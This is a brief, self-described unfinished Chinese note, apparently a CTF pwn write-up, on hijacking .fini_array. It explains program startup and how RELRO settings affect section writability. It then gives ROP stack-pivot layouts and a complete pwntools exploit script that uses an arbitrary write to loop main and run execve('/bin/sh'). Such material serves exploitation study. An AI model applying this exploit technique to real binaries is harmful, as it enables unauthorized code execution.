fini_array劫持（没写完）

总结

  • 虽然写代码的时候我们以main函数作为程序入口，但是编译成程序的时候入口并不是main函数，而是start代码段。事实上，start代码段还会调用__libc_start_main来做一些初始化工作，最后调用main函数并在main函数结束后做一些处理。其流程见于链接http://dbp-consulting.com/tutorials/debugging/linuxProgramStartup.html

    简单地说，在main函数前会调用 .init 段代码和 .init_array 段的函数数组中每一个函数指针。同样的，main函数结束后也会调用 .fini 段代码和 .fini_array 段的函数数组中每一个函数指针。

  • 当RELRO保护为NO RELRO的时候，init.array、fini.array、got.plt均可读可写；

    为PARTIAL RELRO的时候，ini.array、fini.array可读不可写，got.plt可读可写；

    为FULL RELRO时，init.array、fini.array、got.plt均可读不可写。

fini_array + 0x0: (gadget)leave_ret
fini_array + 0x8: (gadget)ret
fini_array + 0x10: ROP chain

fini_array + 0x0: (data)fini_array+0x8
fini_array + 0x8: (gadget)leave_ret
fini_array + 0x10: rop chain

from pwn import*

p = process(“./2”)
context.arch = ‘amd64’

fini_array = 0x4B80B0
_libc_csu_fini = 0x402CB0
main = 0x401C1D
ret = 0x401016
pop_rdx = 0x448415
pop_rsi = 0x406f80
pop_rdi = 0x401746
leave_ret = 0x401cf3
pop_rax = 0x448fcc
binsh = 0x492895
syscall = 0x402514

def write(addr,data):
p.sendlineafter(“addr:”,p64(addr))
p.sendafter(“data:”,data)

p1 = p64(_libc_csu_fini) + p64(main)
write(fini_array,p1)
p2 = flat(pop_rax,59,pop_rdi)
write(fini_array + 0x10,p2)
p3 = flat(binsh,pop_rsi,0)
write(fini_array + 0x10 + 0x18,p3)
p4 = flat(pop_rdx,0,syscall)
write(fini_array + 0x10 + 0x18 + 0x18,p4)

p5 = flat(leave_ret,ret)
write(fini_array,p5)

p.interactive()
